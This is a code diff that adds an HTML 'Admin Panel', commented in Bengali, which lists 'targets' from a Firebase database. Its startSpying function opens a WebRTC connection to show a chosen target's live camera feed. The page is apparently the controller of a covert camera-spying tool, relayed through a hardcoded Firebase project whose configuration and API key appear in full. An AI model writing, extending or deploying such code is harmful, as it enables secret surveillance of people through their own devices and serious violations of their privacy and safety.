@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: sans-serif; padding: 20px; }
+        h2 { color: #00ffcc; text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        #userList { list-style: none; padding: 0; }
+        .user-card { background: #333; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; border: 1px solid #444; transition: 0.3s; }
+        .user-card:hover { background: #444; border-color: #00ffcc; }
+        .online-dot { height: 12px; width: 12px; background-color: #0f0; border-radius: 50%; display: inline-block; box-shadow: 0 0 5px #0f0; }
+        /* ভিডিও প্লেয়ার স্টাইল */
+        #videoContainer { margin-top: 20px; display: none; text-align: center; }
+        video { width: 100%; max-width: 500px; border: 3px solid #00ffcc; border-radius: 10px; background: black; }
+        .btn-close { background: red; color: white; border: none; padding: 5px 10px; cursor: pointer; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+    <h2>🕵️ Admin Panel</h2>
+    
+    <div id="statusText" style="text-align: center; color: #aaa;">Select a target to view camera</div>
+
+    <div id="videoContainer">
+        <video id="remoteVideo" autoplay playsinline controls></video>
+        <br>
+        <button class="btn-close" onclick="location.reload()">Close Connection</button>
+    </div>
+
+    <h3>Active Users:</h3>
+    <ul id="userList"></ul>
+
+    <script>
+        // তোর কনফিগারেশন বসানো হয়েছে
+        const firebaseConfig = {
+          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
+          authDomain: "phone-f605e.firebaseapp.com",
+          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
+          projectId: "phone-f605e",
+          storageBucket: "phone-f605e.firebasestorage.app",
+          messagingSenderId: "902490805880",
+          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
+          measurementId: "G-WSJDCYKM3F"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        // ১. ইউজার লিস্ট লোড করা
+        db.ref("users").on("value", snapshot => {
+            const list = document.getElementById("userList");
+            list.innerHTML = "";
+            snapshot.forEach(child => {
+                const uid = child.key;
+                const user = child.val();
+                
+                // শুধু অনলাইন ইউজারদের দেখাবো
+                const li = document.createElement("li");
+                li.className = "user-card";
+                li.innerHTML = `<span>👤 ${uid}</span> <span class="online-dot"></span>`;
+                li.onclick = () => startSpying(uid); 
+                list.appendChild(li);
+            });
+        });
+
+        // ২. স্পাইং ফাংশন (ভিডিও কানেকশন শুরু)
+        function startSpying(targetId) {
+            document.getElementById("statusText").innerText = "Connecting to " + targetId + "...";
+            
+            // Initiator হিসেবে কানেকশন শুরু
+            const peer = new SimplePeer({ initiator: true, trickle: false });
+
+            // অফার তৈরি করে ডাটাবেজে পাঠানো
+            peer.on('signal', offer => {
+                db.ref("users/" + targetId + "/offer").set(offer);
+            });
+
+            // ইউজারের উত্তরের জন্য অপেক্ষা
+            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
+                const answer = snapshot.val();
+                if (answer) {
+                    peer.signal(answer);
+                }
+            });
+
+            // কানেক্ট হলে ভিডিও প্লে করা
+            peer.on('stream', stream => {
+                document.getElementById("videoContainer").style.display = "block";
+                const video = document.getElementById("remoteVideo");
+                video.srcObject = stream;
+                document.getElementById("statusText").innerText = "🔴 LIVE FEED: " + targetId;
+            });
+            
+            peer.on('error', err => {
+                console.log(err);
+                alert("Connection Error. Target might be offline.");
+            });
+        }
+
+    </script>
+</body>
+</html>
